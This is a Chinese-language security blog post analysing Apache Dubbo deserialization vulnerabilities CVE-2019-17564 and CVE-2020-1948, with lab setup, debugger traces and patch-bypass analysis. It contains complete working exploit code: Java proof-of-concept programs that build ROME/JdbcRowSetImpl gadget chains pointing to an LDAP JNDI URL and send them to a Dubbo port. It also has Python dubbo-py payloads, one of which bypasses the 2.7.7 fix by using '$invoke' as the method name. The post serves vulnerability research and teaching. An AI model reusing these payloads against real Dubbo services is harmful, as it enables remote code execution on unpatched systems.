---
title: "apache Dubbo反序列化"
onlyTitle: true
date: 2025-2-14 16:54:27
categories:
- java
- 框架漏洞
tags:
- apache Dubbo
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8129.png
---

首先，先介绍一下JAVA RPC

# apache Dubbo反序列化

## JAVA RPC

Java RPC（Remote Procedure Call）是一种允许在分布式系统中执行跨进程通信的技术。它使得一个程序可以调用位于不同地址空间（通常是不同的计算机上）的方法，就像调用本地方法一样，而不需要关注底层的网络通信细节。Java RPC 在分布式系统开发中具有重要作用，常用于微服务架构和分布式应用程序。

* JAVA RPC的工作原理：

其实RMI就是属于一种JAVA RPC。

客户端通过调用Client Stub的方法发起请求，代理对象将方法调用和参数封装为请求消息。然后把消息序列化后发送，服务端也有Server Stub接收请求消息，反序列化为方法调用和参数。然后服务端调用实际的方法并序列化结果传输给Client Stub。

注册中心用于记录服务的地址信息，常用的构建工具有Zookeeper、Eureka、Consul。Dubbo官方推荐为Zookeeper

* JAVA 中的RPC框架：包括JAVA RMI、gRPC、Dubbo、Thrift，这些框架的对比如下

![image-20241231140622076](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241231140622076.png)

hessian 是一种跨语言的高效二进制序列化方式。但Dubbo Hessian实际不是原生的 hessian2 序列化，而是阿里修改过的 hessian lite

## Dubbo

Dubbo 提供了内置 RPC 通信协议实现，但它不仅仅是一款 RPC 框架。首先，它不绑定某一个具体的 RPC 协议，开发者可以在基于  Dubbo 开发的微服务体系中使用多种通信协议；其次，除了 RPC 通信之外，Dubbo 提供了丰富的服务治理能力与生态。

在Dubbo架构中，服务端和客户端分别被称作Provider(提供者)、Consumer(消费者)

![image-20241231150621378](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241231150621378.png)



## 环境搭建

下载zookeeper官网的稳定版

https://www.apache.org/dyn/closer.lua/zookeeper/zookeeper-3.8.4/apache-zookeeper-3.8.4-bin.tar.gz

修改conf目录下的zoo_sample.cfg，名称改为zoo.cfg，创建data和log目录，配置内容如下：

```yaml
tickTime=2000
initLimit=10
syncLimit=5
dataDir=C:\\Users\\xxx\\Desktop\\zookeeper‐3.4.14\\conf\\data
dataLogDir=C:\\Users\\xxx\\Desktop\\zookeeper‐3.4.14\\conf\\log
clientPort=2181
```

windows下双击bin目录下的zkServer.cmd即可启动

![image-20241231150125754](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241231150125754.png)

根据dubbo官网可以快速创建一个基于Spring Boot的Dubbo应用，不过是3.3版本的dubbo：

https://dubbo-202409.staged.apache.org/zh-cn/overview/mannual/java-sdk/quick-start/spring-boot/

2.6.x版本的环境：

https://github.com/apache/dubbo-samples/tree/2.6.x

zookeeper归档：

https://archive.apache.org/dist/zookeeper/



解释一下spring xml中的配置：

* 配置协议：

```xml
<dubbo:protocol name="dubbo" port="20880" />
```

* 设置服务默认协议

```xml
<dubbo:provider protocol="dubbo" />
```

* 设置服务协议

```xml
<dubbo:service protocol="dubbo" />
```

比如用hessian协议：

```xml
<dubbo:service protocol="hessian"/>
```

* 多端口

```xml
<dubbo:protocol id="dubbo1" name="dubbo" port="20880" />
<dubbo:protocol id="dubbo2" name="dubbo" port="20881" />
```

引用服务：

```xml
<dubbo:reference protocol="hessian"/>
```

http协议暴露服务：

```xml
<bean id="demoService" class="org.apache.dubbo.samples.http.impl.DemoServiceImpl"/>

<dubbo:service interface="org.apache.dubbo.samples.http.api.DemoService" ref="demoService" protocol="http"/>
```



## CVE-2019-17564 

该漏洞源于dubbo开启http协议后，会把消费者提交的请求在无安全校验的情况下交给spring-web.jar处理，在request.getInputStream被反序列化

* 漏洞范围：

2.7.0 <= Apache Dubbo <= 2.7.4
2.6.0 <= Apache Dubbo <= 2.6.7
Apache Dubbo = 2.5.x



直接看到dubbo-sample-http模块

![image-20250123111239232](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123111239232.png)

在该模块下添加CC依赖测试漏洞

改下http port为80，原来是8080，和burp冲突了

![image-20250123114443867](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123114443867.png)

官方给的demo不用单独开个zookeeper，代码已经集成了。如果想单独开一个可以把new EmbeddedZooKeeper注释掉

![image-20250123164555811](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123164555811.png)

bp向`/org.apache.dubbo.samples.http.api.DemoService`打CC链，弹出计算器

![image-20250123164619601](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123164619601.png)

弹不出的看下request 16进制，`0d 0a 0d 0a`换行后紧接的应该是`ac ed 00 05`的反序列化头

![image-20250123164810236](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123164810236.png)

就不从头分析了，分发过程太复杂了

断点打在com.alibaba.dubbo.remoting.http.servlet.DispatcherServlet#service

![image-20250123165211719](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123165211719.png)

>在2.7.x版本软件包已经从com.alibaba转移到了org.apache
>
>```
>org.apache.dubbo.remoting.http.servlet
>```
>
>而且rpc软件包也进行了修改，使用2.7版本进行测试，环境使用下面的demo，此处省略
>
>https://github.com/apache/dubbo-spring-boot-project/tree/2.7.x
>
>pom区别：2.6.x：
>
>```xml
><dependency>
>    <groupId>com.alibaba</groupId>
>    <artifactId>Dubbo</artifactId>
>    <version>2.6.7</version>
></dependency>
>```
>
>2.7.x:
>
>```xml
><dependency>
>    <groupId>org.apache.dubbo</groupId>
>    <artifactId>dubbo</artifactId>
>    <version>2.7.3</version>
></dependency>
>```

由于协议是http，进入该DispatcherServlet

判断了是否为POST，否则返回500

![image-20250123170154007](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123170154007.png)

此时的skeleton是HttpInvokerServiceExporter，这是个spring http的类

![image-20250123170338970](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123170338970.png)

继续调用HttpInvokerServiceExporter.handleRequest

![image-20250123170356799](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123170356799.png)

![image-20250123171450201](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123171450201.png)

跟进到readRemoteInvocation，先调用createObjectInputStream创建一个ObjectInputStream

![image-20250123171822107](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123171822107.png)

这里参数里的`is`就是我们POST的数据，等于说就是用ObjectInputStream封装了参数`is`

![image-20250123172303695](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123172303695.png)

然后调用doReadRemoteInvocation，里面直接调用了readObject，触发反序列化漏洞

![image-20250123172411564](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123172411564.png)



但是这个洞有很多限制：

1. Dubbo默认通信协议是Dubbo协议，而不是HTTP
2. 需要提前知道目标的RPC接口名

在2.7.5及以后版本不再使用HttpInvokerServiceExporter处理http请求，而是使用com.googlecode.jsonrpc4j.JsonRpcServer，调用其父类的JsonRpcBasicServer#handle处理

![image-20250210183239520](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250210183239520.png)



## CVE-2020-1948 Hessian反序列化

* 漏洞范围：

Apache Dubbo 2.7.0 ~ 2.7.6
Apache Dubbo 2.6.0 ~ 2.6.7
Apache Dubbo 2.5.x 所有版本 (官方不再提供支持)。
在实际测试中2.7.8补丁绕过可以打，而2.7.9失败

在marshalsec中，给了Hessian的几条利用链：

Rome、XBean、Resin、SpringPartiallyComparableAdvisorHolder、SpringAbstractBeanFactoryPointcutAdvisor



### ROME链

调试前关闭`启用"toString"对象试图`，否则漏洞会提前触发

![image-20250123183935529](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250123183935529.png)



由于2.6.x和2.7.x的dubbo包名不同，所以反序列化的payload也不同。如果目标是2.6.x则payload对应修改为com.alibaba.dubbo，如果目标是2.7.x则payload对应修改为org.apache.dubbo

2.7.3的环境：

https://github.com/apache/dubbo-spring-boot-project/tree/2.7.3

使用该demo的dubbo-spring-boot-samples/auto-configure-samples的provider-sample DubboAutoConfigurationProviderBootStrap

![image-20250124133052585](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250124133052585.png)

在provider-samples下的pom中加入rome依赖

```xml
<dependency>
    <groupId>com.rometools</groupId>
    <artifactId>rome</artifactId>
    <version>1.8.0</version>
</dependency>
```

![image-20250124133237770](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250124133237770.png)

JNDI注入如下：

注意引入dubbo、rome和已编译的marshalsec作为依赖，自带了zk，不用单独开了

```xml
<repositories>
    <repository>
        <id>org.example</id>
        <name>marshalsec</name>
        <url>file:${project.basedir}/lib</url>
    </repository>
</repositories>

    <dependency>
        <groupId>org.exploit</groupId>
        <artifactId>marshalsec</artifactId>
        <version>1.0</version>
        <scope>system</scope>
       <systemPath>${project.basedir}/lib/marshalsec-0.0.3-SNAPSHOT-all.jar</systemPath>
    </dependency>
        <dependency>
            <groupId>com.rometools</groupId>
            <artifactId>rome</artifactId>
            <version>1.8.0</version>
        </dependency>
        <dependency>
            <groupId>org.apache.dubbo</groupId>
            <artifactId>Dubbo</artifactId>
            <version>2.7.3</version>
        </dependency>
        <dependency>
            <groupId>com.caucho</groupId>
            <artifactId>hessian</artifactId>
            <version>4.0.38</version>
        </dependency>
```



#### 漏洞触发点1

该触发点可以一直沿用到2.7.13

POC：

```java
package org.exploit.third.Dubbo;

import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

import marshalsec.HessianBase;
import marshalsec.util.Reflections;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
//Apache Dubbo 2.7.0 ~ 2.7.13
//Apache Dubbo 2.6.0 ~ 2.6.7
//Apache Dubbo 2.5.x 所有版本 (官方不再提供支持)。
//在实际测试中2.7.8补丁绕过

public class GadgetsTestHessian {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        //todo 此处填写ldap url
        rs.setDataSourceName("ldap://127.0.0.1:8085/GQOsPFQU");
        rs.setMatchColumn("foo");
        Reflections.setFieldValue(rs, "listeners",null);

        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);

        HashMap s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 1);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 1);
        Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
        Reflections.setFieldValue(s, "table", tbl);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 0x20 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
        HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();
        sf.setAllowNonSerializable(true);
        out.setSerializerFactory(sf);

        out.writeObject(s);

        out.flushBuffer();
        if (out instanceof Cleanable) {
            ((Cleanable) out).cleanup();
        }

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //todo 此处填写被攻击的dubbo服务提供者地址和端口
        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}
```

![Dubbo JNDI](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraDubbo%20JNDI.gif)

第一个断点打在`org.apache.dubbo.rpc.protocol.dubbo.DubboCountCodec#decode()`

![image-20250126105445645](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126105445645.png)

跟进到ExchangeCodec.decode，调用了另一个同名函数decode

![image-20250126105656818](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126105656818.png)

该decode就是先检查魔数、数据长度、负载是否符合要求，如果没问题就调用decodeBody解码消息体，跟进decodeBody

![image-20250126110404905](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126110404905.png)

![image-20250126110724144](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126110724144.png)

`DubboCodec#decodeBody()`是Dubbo解码Dubbo协议消息体的主要函数，根据消息类型(请求或响应)进行不同的处理，如下图`if为真`就作为响应处理

![image-20250126111414262](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126111414262.png)

我们发起的攻击是request，所以进入else。先跟进到CodecSupport.deserialize()

![image-20250126111658022](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126111658022.png)

通过getSerialization获取反序列化器

![image-20250126111720683](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126111720683.png)

反序列化器用一个HashMap静态变量`ID_SERIALIZATION_MAP`存储了

![image-20250126111855182](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126111855182.png)

根据url和id，用的键为2的反序列化器，也就是Hessian2Serialization

![image-20250126112055858](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126112055858.png)

![image-20250126112107718](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126112107718.png)

接着就能跟进到Hessian2Serialization.deserialize，实例化了一个Hessian2ObjectInput

![image-20250126113103658](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126113103658.png)

中间有些loadClass加载caucho hessian类的过程

![image-20250126113633663](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126113633663.png)

可以看见后面返回的封装内容，其中`_is`就是我们传入的payload流

![image-20250126135906487](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250126135906487.png)

随后调用了ExchangeCodec.decodeHeartbeatData

![image-20250208155904451](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208155904451.png)

在该方法内直接调用了Hessian2ObjectInput.readObject

![image-20250208160001777](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208160001777.png)

继续跟进到`Hessian2Input.readObject(List<Class<?>> expectedTypes)`处，直接跳到了case H（为什么是H后面会说），这里发现是取的Map的反序列化器

![image-20250208160116587](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208160116587.png)

所以跳到了MapDeserializer.readMap，并调用了doReadMap

![image-20250208160647497](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208160647497.png)

![image-20250208160734685](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208160734685.png)

doReadMap循环readObject输入流，只不过此处的readObject是Hessian的readObject而不是原生的ObjectInputStream

![image-20250208160817723](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208160817723.png)

OK此处用Hessian反序列化出了EqualsBean

![image-20250208162159378](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208162159378.png)

在还原出EqualsBean后，会调用map.put

![image-20250208162348496](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208162348496.png)

在put的时候，进入经典的put -> hash -> EqualsBean.hashCode() 触发ROME链的过程

![image-20250208162422937](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208162422937.png)

现在我们回过头来可以发现，为什么会进入case H? 因为我们传输的就是个hashMap，以h打头，而且也解释了为什么会直接取的是MapDeserializer

而且在还原对象的时候，跟进到in.readObject

![image-20250208195024052](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208195024052.png)

继续跟进五步左右，看到调用了instantiate

![image-20250208195125709](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208195125709.png)

所以dubbo hessian反序列化是通过构造函数还原的类

![image-20250208195326865](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208195326865.png)

payload之所以用反射装填hashMap，是怕提前触发了map.put

按理说hashMap.put也OK：

```java
package org.exploit.third.Dubbo;

import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.ObjectBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.rowset.JdbcRowSetImpl;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import marshalsec.HessianBase;
import marshalsec.util.Reflections;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Random;

//Apache Dubbo 2.7.0 ~ 2.7.6
//Apache Dubbo 2.6.0 ~ 2.6.7
//Apache Dubbo 2.5.x 所有版本 (官方不再提供支持)。
//在实际测试中2.7.8补丁绕过可以打，而2.7.9失败

public class diyTestHessian {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        //todo 此处填写ldap url
        rs.setDataSourceName("ldap://127.0.0.1:8085/GQOsPFQU");
        rs.setMatchColumn("foo");
        Reflections.setFieldValue(rs, "listeners",null);
        JdbcRowSetImpl rs1 = new JdbcRowSetImpl();

        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs1);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);

        HashMap s = new HashMap<>();
        s.put(root,root);
        Field field = ToStringBean.class.getDeclaredField("obj");
        field.setAccessible(true);
        field.set(item,rs);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 0x20 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
        HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();
        sf.setAllowNonSerializable(true);
        out.setSerializerFactory(sf);

        out.writeObject(s);

        out.flushBuffer();
        if (out instanceof Cleanable) {
            ((Cleanable) out).cleanup();
        }

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //todo 此处填写被攻击的dubbo服务提供者地址和端口
        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

![image-20250208194612706](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208194612706.png)

调用栈：

```java
connect:615, JdbcRowSetImpl (com.sun.rowset)
getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
toString:158, ToStringBean (com.rometools.rome.feed.impl)
toString:129, ToStringBean (com.rometools.rome.feed.impl)
beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
hash:338, HashMap (java.util)
put:611, HashMap (java.util)
//以上为rome链
    
doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readObject:2703, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2278, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:85, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
decodeHeartbeatData:413, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)
decodeBody:125, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)
decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)
decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)
decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)
//到达sink点
    
decode:90, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)
decodeRemovalReentryProtection:502, ByteToMessageDecoder (io.netty.handler.codec)
callDecode:441, ByteToMessageDecoder (io.netty.handler.codec)
channelRead:278, ByteToMessageDecoder (io.netty.handler.codec)
invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)
invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)
fireChannelRead:352, AbstractChannelHandlerContext (io.netty.channel)
channelRead:1408, DefaultChannelPipeline$HeadContext (io.netty.channel)
invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)
invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)
fireChannelRead:930, DefaultChannelPipeline (io.netty.channel)
read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)
processSelectedKey:682, NioEventLoop (io.netty.channel.nio)
processSelectedKeysOptimized:617, NioEventLoop (io.netty.channel.nio)
processSelectedKeys:534, NioEventLoop (io.netty.channel.nio)
run:496, NioEventLoop (io.netty.channel.nio)
run:906, SingleThreadEventExecutor$5 (io.netty.util.concurrent)
run:74, ThreadExecutorMap$2 (io.netty.util.internal)
run:30, FastThreadLocalRunnable (io.netty.util.concurrent)
run:745, Thread (java.lang)
```





#### 漏洞触发点2

网上还有一个python的payload：

```python
# -*- coding: utf-8 -*-
#pip3 install dubbo-py
from dubbo.codec.hessian2 import Decoder,new_object
from dubbo.client import DubboClient

client = DubboClient('127.0.0.1', 20880)

JdbcRowSetImpl=new_object(
      'com.sun.rowset.JdbcRowSetImpl',
      dataSource="ldap://127.0.0.1:8085/BSLQJNYb",
      strMatchColumns=["foo"]
      )
JdbcRowSetImplClass=new_object(
      'java.lang.Class',
      name="com.sun.rowset.JdbcRowSetImpl",
      )
toStringBean=new_object(
      'com.rometools.rome.feed.impl.ToStringBean',
      beanClass=JdbcRowSetImplClass,
      obj=JdbcRowSetImpl
      )

resp = client.send_request_and_return_response(
service_name='any',
method_name='any',
args=[toStringBean])
```

注意到这个payload里面并没有使用到hashMap、hashTable之类的进行装配，为什么还能触发？

抓包发现响应包进行报错，`any:1.0:20880 in [org.apache.dubbo.spring.boot.demo.consumer.DemoService:1.0.0:20880]`

![image-20250208154456286](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208154456286.png)

调试一下，在decodeHeartbeatData()肯定不会触发漏洞了，因为没有map，不会进入MapDeserializer.doReadMap



把断点打在`DecodeHandler.received(Channel channel, Object message)`处，此时已经还原完成了对象，准备进行处理

![image-20250208203334040](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208203334040.png)

根据消息类型（请求、响应、字符串）进行不同处理：
请求：区分事件请求、双向请求和单向请求。
响应：调用 handleResponse 方法。
字符串：判断是否为客户端并处理 Telnet 命令。

我们这里进行的当然是双向请求，还要获取服务器响应的那种。调用handleRequest

![image-20250208203950239](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208203950239.png)

接着调用reply

![image-20250208204216033](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208204216033.png)

reply内调用了getInvoker，别忘了Dubbo rpc的初衷，就是为了远程调用方法

![image-20250208204248203](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208204248203.png)

在getInvoker中，尝试从exporterMap中获取指定的service_name:method_name方法，但是没找到，于是走到throw new RemotingException报异常

![image-20250208204421773](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoratyporaimage-20250208204421773.png)

![image-20250208204454769](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208204454769.png)

关键就是字符串拼接的时候，会自动调用StringBuilder.append方法，此处inv正是包含恶意请求的DecodeableRpcInvocation

![image-20250208205133919](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208205133919.png)

继续跟进到RpcInvocation.toString，发现调用了Array.toString

![image-20250208205152287](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208205152287.png)

参数就是ToStringBean的一个Object[]

![image-20250208205303633](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208205303633.png)

然后是一个Array的循环调valueOf，随后进入ToStringBean触发rome链

![image-20250208205417863](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208205417863.png)

![image-20250208205439942](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208205439942.png)

回到上面验证一下猜想，如下，填入正确的`service_name`,`method_name`,`service_version`，就不会弹计算器，因为没报找不到方法的异常

```python
# -*- coding: utf-8 -*-
#pip3 install dubbo-py
from dubbo.codec.hessian2 import Decoder,new_object
from dubbo.client import DubboClient

client = DubboClient('127.0.0.1', 20880)

JdbcRowSetImpl=new_object(
      'com.sun.rowset.JdbcRowSetImpl',
      dataSource="ldap://127.0.0.1:8085/GQOsPFQU",
      strMatchColumns=["foo"]
      )
JdbcRowSetImplClass=new_object(
      'java.lang.Class',
      name="com.sun.rowset.JdbcRowSetImpl",
      )
toStringBean=new_object(
      'com.rometools.rome.feed.impl.ToStringBean',
      beanClass=JdbcRowSetImplClass,
      obj=JdbcRowSetImpl
      )

resp = client.send_request_and_return_response(
service_name='org.apache.dubbo.spring.boot.demo.consumer.DemoService',
method_name='sayHello',
service_version='1.0.0',
args=[toStringBean])
```



#### 2.7.7补丁绕过分析

低版本DecodeableRpcInvocation.decode如下：

![image-20250208211854161](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250208211854161.png)

2.7.7版本内DecodeableRpcInvocation增加了一个if判断，判断失败会抛出IllgalArgumentException

![image-20250210194934806](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250210194934806.png)

RpcUtils.isGenericCall()对比了method参数是否和`INVOKE`常量或者`INVOKE_ASYNC`常量的值相同

![image-20250210194946386](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250210194946386.png)

![image-20250210195027789](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250210195027789.png)

RpcUtils.isEcho也是类似

![image-20250210195003228](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250210195003228.png)

![image-20250210195055837](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250210195055837.png)



让method的值等于“$invoke”，“$invokeAsync”，“$echo”任意一个即可绕过

```python
# -*- coding: utf-8 -*-
#pip3 install dubbo-py
from dubbo.codec.hessian2 import Decoder,new_object
from dubbo.client import DubboClient

client = DubboClient('127.0.0.1', 20880)

JdbcRowSetImpl=new_object(
      'com.sun.rowset.JdbcRowSetImpl',
      dataSource="ldap://127.0.0.1:8085/BSLQJNYb",
      strMatchColumns=["foo"]
      )
JdbcRowSetImplClass=new_object(
      'java.lang.Class',
      name="com.sun.rowset.JdbcRowSetImpl",
      )
toStringBean=new_object(
      'com.rometools.rome.feed.impl.ToStringBean',
      beanClass=JdbcRowSetImplClass,
      obj=JdbcRowSetImpl
      )

resp = client.send_request_and_return_response(
service_name='any',
method_name='$invoke',
args=[toStringBean])
```



#### 2.7.8补丁

在2.7.8版本，DecodeableRpcInvocation.decode增加限制了参数类型为`Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;` 或者``Ljava/lang/Object;`

![image-20250210195253195](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250210195253195.png)

